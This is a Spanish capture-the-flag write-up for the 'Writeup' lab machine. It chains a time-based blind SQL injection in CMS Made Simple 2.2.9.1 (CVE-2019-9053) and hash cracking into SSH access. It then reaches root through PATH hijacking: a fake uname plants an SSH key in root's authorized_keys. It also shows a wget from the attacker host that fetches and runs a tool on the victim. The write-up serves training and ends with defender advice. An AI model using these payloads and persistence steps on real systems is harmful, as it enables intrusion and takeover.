Writeup — CMS Made Simple SQLi + PATH Hijacking

Explotación de CMS Made Simple 2.2.9.1 vulnerable a SQL Injection ciega basada en tiempo (CVE-2019-9053). Extracción de credenciales mediante script Python, cracking con hashcat, acceso SSH y escalada de privilegios mediante PATH hijacking en un proceso update-motd ejecutado por root.

Target10.129.19.66
OSDebian 9
Puertos22, 80
Tiempo~15 min
Comandos10

Resumen Ejecutivo

La máquina Writeup expone Apache 2.4.25 en el puerto 80 con CMS Made Simple 2.2.9.1. El archivo robots.txt revela la ruta /writeup/. La versión del CMS es vulnerable a CVE-2019-9053 (SQL Injection time-based blind), lo que permite extraer credenciales de la base de datos sin autenticación. Tras crackear el hash MD5 salteado con hashcat, se obtiene acceso SSH. La escalada a root se logra mediante PATH hijacking: el usuario pertenece al grupo staff que tiene permisos de escritura en /usr/local/sbin, directorio consultado primero por un proceso de update-motd ejecutado como root en cada conexión SSH.

Reconocimiento — Paso a Paso

Paso 1 — Reconocimiento

Escaneo completo de puertos — nmap -p-

¿Por qué este comando?

Mapear toda la superficie expuesta. Un escaneo de los 65535 puertos garantiza que no perdamos servicios en puertos no estándar. SYN scan (-sS) para no completar el handshake TCP — más rápido y menos ruido en logs.

nmap -p- --open -n -T4 -sS 10.129.19.66
-p- → todos los 65535 puertos TCP
--open → solo puertos abiertos
-sS → SYN scan: envía SYN sin completar handshake
-T4 → velocidad agresiva
Output
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
¿Qué nos dice este output?
  • Solo 2 puertos abiertos: SSH (22) y HTTP (80)
  • Superficie de ataque reducida — el puerto 80 es el vector más probable
Decisión tomada

Ejecutar nmap -sC -sV en los puertos descubiertos para detectar versiones y ejecutar scripts NSE.

Paso 2 — Reconocimiento

Enumeración de servicios — nmap -sC -sV

¿Por qué este comando?

Detectar versiones exactas del software es crítico para buscar CVEs. El flag -sC ejecuta scripts NSE por defecto, que entre otras cosas leen automáticamente robots.txt.

nmap -p22,80 -sC -sV -n 10.129.19.66
-p22,80 → solo los puertos descubiertos
-sC → scripts NSE por defecto
-sV → detectar versión exacta del servicio
Output
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6
80/tcp open  http    Apache httpd 2.4.25
| http-robots.txt: 1 disallowed entry
|_/writeup/
|_http-title: Nothing here yet.
¿Qué nos dice este output?
  • Nmap detectó automáticamente el robots.txt con entrada prohibida: /writeup/
  • Apache 2.4.25 + Debian 9 Stretch — versiones antiguas con posibles CVEs
  • No es necesario hacer fuzzing — el servidor ya reveló la ruta clave
Decisión tomada

Investigar /writeup/ directamente. El robots.txt es un mapa del tesoro que los administradores crean creyendo que oculta rutas de Google, pero es visible para cualquier atacante.

Paso 3 — Reconocimiento

Fingerprint del CMS — curl + CHANGELOG.txt

¿Por qué este comando?

Identificar el CMS y su versión exacta para buscar vulnerabilidades conocidas. El CHANGELOG.txt expone públicamente la versión — una misconfiguration común.

curl -s http://10.129.19.66/writeup/doc/CHANGELOG.txt | head -2
Output
Version 2.2.9.1
-------------------------------
¿Qué nos dice este output?
  • CMS Made Simple versión 2.2.9.1 — vulnerable a CVE-2019-9053
  • Una versión de diferencia (2.2.9 vs 2.2.10) = SQLi crítica

Explotación — CVE-2019-9053

⚠ CVE-2019-9053 — SQL Injection (Time-Based Blind)

El parámetro m1_idlist en el módulo News de CMS Made Simple no sanitiza el input antes de incluirlo en una consulta SQL. El atacante puede inyectar funciones de retardo (SLEEP()) para inferir datos de la base de datos caracter por caracter. No requiere autenticación.

Paso 4 — Explotación

Búsqueda de exploit — searchsploit

¿Por qué este comando?

searchsploit es la CLI de Exploit-DB. Buscar por nombre + versión del CMS nos da exploits públicos sin necesidad de internet.

searchsploit "cms made simple 2.2"
Output
CMS Made Simple < 2.2.10 - SQL Injection  | php/webapps/46635.py
Decisión tomada

Copiar el exploit y adaptarlo a Python3 (el original usa termcolor en Python2). El exploit usa SQLi time-based para extraer salt, username, email y hash de contraseña.

Paso 5 — Explotación

Ejecución del SQLi — extracción de credenciales

¿Cómo funciona el ataque?

El exploit envía peticiones GET con payloads como:
m1_idlist=a,b,1,5))+and+(select+sleep(1)+from+cms_siteprefs+where+sitepref_value+like+0x3561...25)+--+
Si el servidor tarda ≥1 segundo, el caracter es correcto. Se repite para cada posición hasta reconstruir el valor completo.

python3 exploit.py -u http://10.129.19.66/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
Output — ~8 minutos de SQLi time-based
[*] Salt: 5a599ef579066807

[*] Username: jkr
[+] Username found: jkr

[*] Email: jkr@writeup.htb

[*] Password hash: 62def4866937f08cc13bab43bb14e6f7
[+] Password hash: 62def4866937f08cc13bab43bb14e6f7
¿Qué obtuvimos?

El hash es MD5 salteado en formato md5(salt + password). Tenemos todos los ingredientes para crackearlo con hashcat.

⚠️
Nota

El --crack del exploit Python2/3 falla con UnicodeDecodeError en rockyou.txt. Usar hashcat directamente con modo 20.

Paso 6 — Explotación

Cracking del hash — hashcat mode 20

¿Por qué modo 20?

hashcat -m 20 corresponde al formato md5($salt.$pass) — exactamente cómo CMS Made Simple almacena contraseñas: calcula MD5 de la concatenación de salt + password.

echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" > hash.txt
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt --force
Output — 2 segundos (GPU)
Status: Cracked
Hash.Mode: 20 (md5($salt.$pass))
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9

Time.Started: 2 secs | Speed: 1967.0 kH/s
Credenciales obtenidas

jkr : raykayjay9 — La contraseña estaba en rockyou.txt (rank ~4.3M). Crackeada en 2 segundos con GPU.

Escalada de Privilegios — PATH Hijacking

Paso 8 — Escalada

Monitoreo de procesos — pspy64

¿Qué es pspy64?

Herramienta que monitorea procesos Linux sin necesidad de root, usando inotify y lectura de /proc. Cuando el checklist básico (sudo -l, SUID, capabilities) no revela el vector, pspy descubre procesos periódicos o disparados por eventos.

# En Kali: servir pspy64
python3 -m http.server 8888
# En la víctima:
wget http://[LHOST]:8888/pspy64 && chmod +x pspy64 && ./pspy64
Output — al hacer SSH login desde otra terminal
CMD: UID=0 PID=1769 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
CMD: UID=0 PID=1770 | run-parts --lsbsysinit /etc/update-motd.d
CMD: UID=0 PID=1771 | /bin/sh /etc/update-motd.d/10-uname
¿Qué reveló?
  • Cada vez que alguien se conecta por SSH, sshd ejecuta como UID=0 (root):
  • PATH=/usr/local/sbin:... run-parts /etc/update-motd.d
  • El script 10-uname llama al comando uname sin ruta absoluta
  • El PATH busca primero en /usr/local/sbin — si es writable por jkr (grupo staff), podemos inyectar un uname falso
Decisión tomada

Verificar si /usr/local/sbin es writable por staff, luego crear /usr/local/sbin/uname malicioso.

Paso 9 — Escalada

Verificación de permisos y PATH Hijacking

¿Qué es PATH Hijacking?

Cuando un proceso privilegiado ejecuta un comando sin ruta absoluta (ej: uname en lugar de /bin/uname), el sistema busca en los directorios del PATH en orden. Si podemos colocar un binario malicioso en un directorio que aparece ANTES que el legítimo, nuestro código se ejecuta con los privilegios del proceso padre.

# Verificar que podemos escribir
ls -la /usr/local/ | grep sbin
Output
drwx-wsr-x  2 root staff 12288 Apr 19 2019 sbin
# Crear binario malicioso uname
cat > /usr/local/sbin/uname << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...kali@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
EOF
chmod +x /usr/local/sbin/uname
¿Qué hicimos?

Creamos /usr/local/sbin/uname — un script bash que añade nuestra clave SSH pública al archivo /root/.ssh/authorized_keys. Cuando la próxima conexión SSH dispare update-motd, este script se ejecutará como root.

Paso 10 — Root

Trigger + Root Flag

# Conectar SSH para disparar el trigger
ssh jkr@10.129.19.66 'echo trigger'
# Conectar como root con la clave inyectada
ssh -i ~/.ssh/id_rsa root@10.129.19.66 'id && cat /root/root.txt'

Lecciones Aprendidas

⚔ Para el Atacante

  • robots.txt primero — Leer antes de lanzar gobuster. Ahorra 10 minutos de fuzzing.
  • Versión exacta importa — 2.2.9 vs 2.2.10: una versión = SQLi crítica.
  • fail2ban ≠ inmune a SQLi — Protege login, no parámetros GET.
  • pspy64 cuando el checklist falla — Monitorear procesos al hacer SSH simultáneamente.
  • Grupo staff = señal de alarma — Verificar /usr/local/sbin permisos.
  • hashcat -m 20 para md5(salt+pass) — No confiar en el --crack del exploit.

🛡 Para el Defensor

  • Actualizar CMS Made Simple a versión ≥ 2.2.10 inmediatamente.
  • No exponer CHANGELOG.txt públicamente — revela la versión exacta.
  • Usar rutas absolutas en scripts ejecutados como root.
  • Auditar permisos del grupo staff: chmod 755 /usr/local/sbin
  • Monitorear creación de archivos en /usr/local/sbin con auditd.
  • Regla IDS: múltiples requests con SLEEP() en params GET → SQLi.
